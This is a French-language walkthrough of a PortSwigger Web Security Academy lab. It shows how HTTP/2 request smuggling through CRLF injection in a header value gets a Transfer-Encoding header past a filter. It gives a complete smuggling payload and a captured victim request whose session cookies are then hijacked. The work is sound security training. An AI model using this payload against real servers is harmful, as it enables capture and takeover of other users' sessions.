# Lab

https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-request-smuggling-via-crlf-injection

## Solution

Sur ce lab on peut mener une attaque de type HTTP Request Smuggling mais le serveur accepte uniquement les requêtes HTTP/2.

De plus une protection est effective sur cet host, supprimant le header `Transfer-Encoding`.

On peut bypass ce contrôle en utilisant une attaque de type CRLF Injection sur un header.

Pour faire ça, sur l'onglet `Inspector` du `Repeater`, dans `Request headers`, on va ajouter un header random comme `Foo: bar` en ajoutant les caractères `\r\n` pour faire un retour à la ligne, suivi de `Transfer-Encoding: chunked`.

Ce qui donne `Foo: bar\r\nTransfer-Encoding: chunked`.

Le serveur ne verras que `Foo: bar` et le header `Transfer-Encoding` sera ajouté à la requête par le proxy.

Ensuite on ajoute le `Content-Length` dans `Request body` et on fait en sorte que la taille soit dynamique et corresponde à la taille totale du body (y compris la requête smugglée).

On peut utiliser le payload suivant :

```http
POST / HTTP/2
Host: 0a96009204b1f87d8419ef53007d000a.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 103
Foo: bar\r\nTransfer-Encoding: chunked

0

POST / HTTP/1.1
Cookie: session=iXBAAlgNR0ylqgglCUbFpON0YQUjXpYZ
Content-Length: 830

search=
```

Sur ce lab, il y a une fonctionnalité de recherche qui affiche la liste des récentes recherches liées à notre session (cookie `session`).

Si on utilise la requête du dessus, on va smuggler notre requeête de recherche et on pourra en voir les résultats dans la page d'accueil.

On mets volontairement un `Content-Length` de 830 pour que la requête smugglée de la victime soit ajoutée à la suite.

On attends 15 secondes que le bot visite la page d'accueil et on peut voir notre recherche dans la liste des récentes recherches.

```http
GET / HTTP/1.1
Host: 0a96009204b1f87d8419ef53007d000a.web-security-academy.net
sec-ch-ua: &quot;Google Chrome&quot;;v=&quot;119&quot;, &quot;Chromium&quot;;v=&quot;119&quot;, &quot;Not?A_Brand&quot;;v=&quot;24&quot;
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: &quot;Linux&quot;
upgrade-insecure-requests: 1
user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
sec-fetch-site: none
sec-fetch-mode: navigate
sec-fetch-user: ?1
sec-fetch-dest: document
accept-encoding: gzip, deflate, br
accept-language: en-US,en;q=0.9
cookie: victim-fingerprint=SpPnEzdQLU3t9jAWTO6tYyYrXSbwAeXp; secret=UZKK99BAxZmkz6JF0M9bydRfqflWEaBn; session=DYklahU2m8RhuTRthMNkkwLC8KfRbWOu; _lab_analytics=snTApnyXwRL
```

On a plus qu'à injecter ces cookies dans notre navigateur et on valide le lab.